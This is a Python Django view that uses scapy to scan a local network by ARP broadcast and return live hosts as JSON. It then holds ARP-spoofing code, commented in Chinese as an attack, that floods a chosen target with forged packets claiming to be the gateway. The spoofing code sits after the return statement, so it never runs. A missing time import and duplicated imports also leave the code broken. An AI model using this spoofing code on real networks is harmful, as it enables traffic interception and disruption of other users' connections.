from scapy.all import *
import uuid
import json
from django.http import HttpResponse, JsonResponse
from django.http import HttpResponse
from scapy.all import *
import json
import os

def pcs(request):
    wifi = 'Intel(R) Dual Band Wireless-AC 3165'
    datas = []
    # 扫描局域网，显示活跃主机
    for line in os.popen('route print'):
        s = line.strip()  # 去掉每行的空格
        if s.startswith('0.0.0.0'):
            slist = s.split()
            ip = slist[3]  # 本机IP
            gw = slist[2]  # 本机网关
            break
    tnet = gw + '/24'
    # 构造一个ARP广播包，向整个网络的每台主机发起ARP广播
    p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=tnet)
    # ans 表示收到的包的回复
    ans, unans = srp(p, iface=wifi, timeout=2, verbose=0)
    print(len(ans))
    for s, r in ans:
        print(r[ARP].psrc, r[ARP].hwsrc)
        data = {
            'ip': r[ARP].psrc,
            'gw': gw,
            'mac': r[ARP].hwsrc
        }
        datas.append(data)
    print(datas)
    trafficJson = json.dumps(datas)
    return HttpResponse(trafficJson, content_type="application/json")

    target = request.POST.get("name")
    print(target)
    t = request.POST.get("time")
    print(t)

    # 构造一个欺骗数据包，告诉被攻击者，我是网关
    p1 = Ether(dst='ff:ff:ff:ff:ff:ff', src='14:4f:8a:69:0e:a6') / ARP(pdst=target, psrc=gw)
    # 周期性的发包,欺骗模式
    print("攻击开始。。。")
    for i in range(10 * int(t)):
        sendp(p1, verbose=0)
        time.sleep(0.1)
    print("攻击结束。。。")


